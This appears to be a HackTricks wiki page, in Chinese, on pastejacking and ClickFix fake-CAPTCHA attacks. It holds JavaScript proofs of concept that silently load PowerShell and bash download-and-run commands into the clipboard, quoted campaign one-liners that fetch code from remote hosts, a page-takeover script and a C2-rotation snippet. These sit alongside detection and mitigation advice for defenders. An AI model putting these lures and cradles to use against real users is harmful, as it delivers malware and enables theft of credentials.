# 剪贴板劫持 (Pastejacking) 攻击

{{#include ../../banners/hacktricks-training.md}}

> “永远不要粘贴任何你没有自己复制过的内容。” – 旧但仍然有效的建议

## 概述

剪贴板劫持 — 也称为 *pastejacking* — 利用用户在不检查内容的情况下常常复制粘贴命令的习惯。恶意网页（或任何支持 JavaScript 的上下文，例如 Electron 或桌面应用）可以以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常会在精心设计的社会工程指示下被鼓励按 **Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell），或打开终端并粘贴剪贴板内容，从而立即执行任意命令。

因为 **没有文件被下载也没有附件被打开**，该技术绕过了大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此该攻击在传播常见恶意软件系列（如 NetSupport RAT、Latrodectus loader 或 Lumma Stealer）的钓鱼活动中很受欢迎。

## 强制复制按钮和隐藏的有效载荷（macOS 一行命令）

一些 macOS infostealers 克隆安装站点（例如 Homebrew）并**强制使用“Copy”按钮**，使用户无法仅选中可见文本。剪贴板条目包含预期的安装命令以及附加的 Base64 有效载荷（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴就会执行两部分，而 UI 隐藏了额外的阶段。

## JavaScript 概念验证
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
较早的活动使用 `document.execCommand('copy')`，较新的则依赖异步的 **Clipboard API**（`navigator.clipboard.writeText`）。

## ClickFix / ClearFake 流程

1. 用户访问一个 typosquatted 或被入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用一个 `unsecuredCopyToClipboard()` 辅助函数，悄悄将一个 Base64-encoded PowerShell 单行命令存入剪贴板。
3. HTML 指示告诉受害者：*“按 **Win + R**，粘贴命令并按 Enter 以解决该问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的归档（经典的 DLL sideloading）。
5. loader 解密额外阶段，注入 shellcode 并安装持久化（例如 scheduled task）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### NetSupport RAT 示例链
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) 在其目录中搜索 `msvcp140.dll`。
* 恶意的 DLL 动态通过 **GetProcAddress** 解析 API，使用 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），用滚动 XOR 密钥 `"https://google.com/"` 对它们解密，注入最终的 shellcode，并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript 下载器
3. 获取 MSI payload → 将 `libcef.dll` 放置在已签名应用程序旁 → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer 通过 MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 调用启动一个隐藏的 PowerShell 脚本，该脚本检索 `PartyContinued.exe`，提取 `Boat.pst`（CAB），通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，最后运行一个 `.a3x` 脚本，将浏览器凭证外传到 `sumeriavgv.digital`。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix 活动完全跳过文件下载，指示受害者粘贴一行命令，该命令通过 WSH 获取并执行 JavaScript，进行持久化，并每天轮换 C2。观察到的示例链：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 在运行时将混淆的 URL 反转以防止表面检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 将自身持久化，并根据当前日期选择 C2 —— 实现快速的 domain rotation。

用于按日期旋转 C2s 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常部署一个 loader，建立持久性并拉取一个 RAT（例如 PureHVNC），常把 TLS 锁定到硬编码证书并对流量进行分块处理。

Detection ideas specific to this variant
- 进程树： `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动痕迹：位于 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 的 LNK，调用 WScript/CScript，JS 路径位于 `%TEMP%`/`%APPDATA%` 下。
- Registry/RunMRU 和命令行遥测包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复出现的 `powershell -NoProfile -NonInteractive -Command -`，通过大的 stdin 有效负载来喂入长脚本以避免长命令行。
- 计划任务随后执行 LOLBins，例如在看起来像更新程序的任务/路径下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

Threat hunting
- 每日轮换的 C2 主机名和 URL，符合 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联剪贴板写入事件，随后 Win+R 粘贴然后立即执行 `powershell.exe`。

蓝队可以结合剪贴板、进程创建和注册表遥测来定位 pastejacking 滥用：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 保存 **Win + R** 命令的历史记录 — 查找异常的 Base64 / 混淆条目。
* Security Event ID **4688**（Process Creation），其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 属于 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }。
* Event ID **4663** 指示在可疑 4688 事件之前于 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建。
* EDR 剪贴板传感器（如果存在）– 关联 `Clipboard Write` 随即紧接新 PowerShell 进程的出现。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近的活动大规模制作伪造的 CDN/浏览器 验证页面（“Just a moment…”，IUAM-style），强迫用户将 OS 特定命令从剪贴板复制到本地终端。这会将执行从浏览器沙箱转移出去，并在 Windows 和 macOS 上都能工作。

构建器生成页面的关键特征
- 通过 `navigator.userAgent` 检测操作系统以定制有效载荷（Windows PowerShell/CMD vs. macOS Terminal）。对于不支持的操作系统可选地使用诱饵/无操作以维持幻象。
- 在无害的 UI 操作（复选框/Copy）时自动将内容复制到剪贴板，而可见文本可能与剪贴板内容不同。
- 阻止移动端并显示带逐步说明的弹出框：Windows → Win+R→paste→Enter；macOS → 打开 Terminal→粘贴→Enter。
- 可选的混淆和单文件注入器，用于用 Tailwind 风格的验证 UI 覆盖被入侵站点的 DOM（无需注册新域名）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence 的初始运行
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` 以便在终端关闭后继续执行，减少可见痕迹。

In-place page takeover 在被入侵的网站上
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
针对 IUAM 风格诱饵的检测与狩猎思路
- Web：将 Clipboard API 绑定到验证控件的页面；显示文本与剪贴板载荷不匹配；`navigator.userAgent` 分支；在可疑场景中使用 Tailwind + 单页替换。
- Windows endpoint：在浏览器交互后不久出现 `explorer.exe` → `powershell.exe`/`cmd.exe`；从 `%TEMP%` 执行的 batch/MSI 安装程序。
- macOS endpoint：Terminal/iTerm 在接近浏览器事件时生成带 `nohup` 的 `bash`/`curl`/`base64 -d`；后台作业在关闭终端后仍然存活。
- 将 `RunMRU` Win+R 历史和剪贴板写入与随后的控制台进程创建相关联。

另见支持性技术

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 伪造 CAPTCHA / ClickFix 演进 (ClearFake, Scarlet Goldfinch)

- ClearFake 继续入侵 WordPress 站点并注入 loader JavaScript，链式调用外部主机（Cloudflare Workers、GitHub/jsDelivr），甚至调用区块链的“etherhiding”接口（例如对 Binance Smart Chain API 端点如 `bsc-testnet.drpc[.]org` 的 POST）以拉取当前诱饵逻辑。最近的覆盖层大量使用伪造 CAPTCHA，指示用户复制/粘贴一行命令（T1204.004），而不是下载任何东西。
- 初始执行越来越多地委派给签名脚本宿主/LOLBAS。2026 年 1 月的链条将此前使用的 `mshta` 换成通过 `WScript.exe` 执行的内置 `SyncAppvPublishingServer.vbs`，传递类似 PowerShell 的参数并使用别名/通配符来获取远程内容：
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` 已签名，通常由 App-V 使用；与 `WScript.exe` 及不寻常的参数（`gal`/`gcm` 别名、通配符 cmdlets、jsDelivr URLs）配合时，它成为 ClearFake 的一个高信号 LOLBAS 阶段。
- 2026 年 2 月的伪 CAPTCHA payloads 再次转向纯 PowerShell 下载载体。两个实时示例：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 第一条链是在内存中的 `iex(irm ...)` 抓取器；第二条通过 `WinHttp.WinHttpRequest.5.1` 进行二阶段，写入临时 `.ps1`，然后以隐藏窗口用 `-ep bypass` 启动。

Detection/hunting tips for these variants
- 进程谱系：浏览器 → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 或 PowerShell cradles，通常在剪贴板写入/按 Win+R 后立即发生。
- 命令行关键词：`SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker 域名，或原始 IP 的 `iex(irm ...)` 模式。
- 网络：在网页浏览后不久，脚本宿主/PowerShell 向 CDN worker 主机或区块链 RPC 端点发起的外发连接。
- 文件/注册表：在 `%TEMP%` 下创建临时 `.ps1`，并在 RunMRU 中出现这些单行命令；对以外部 URL 或混淆别名字符串执行的已签名脚本 LOLBAS (WScript/cscript/mshta) 发出阻断/告警。

## Mitigations

1. 浏览器强化 – 禁用剪贴板写入访问（`dom.events.asyncClipboard.clipboardItem` 等）或要求用户手势。
2. 安全意识培训 – 教导用户*手动输入*敏感命令或先将其粘贴到文本编辑器中再执行。
3. 使用 PowerShell Constrained Language Mode / Execution Policy + Application Control 来阻止任意单行命令。
4. 网络控制 – 阻断到已知 pastejacking 和 malware C2 域名的外发请求。

## Related Tricks

* **Discord Invite Hijacking** 通常在将用户诱导到恶意服务器后滥用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
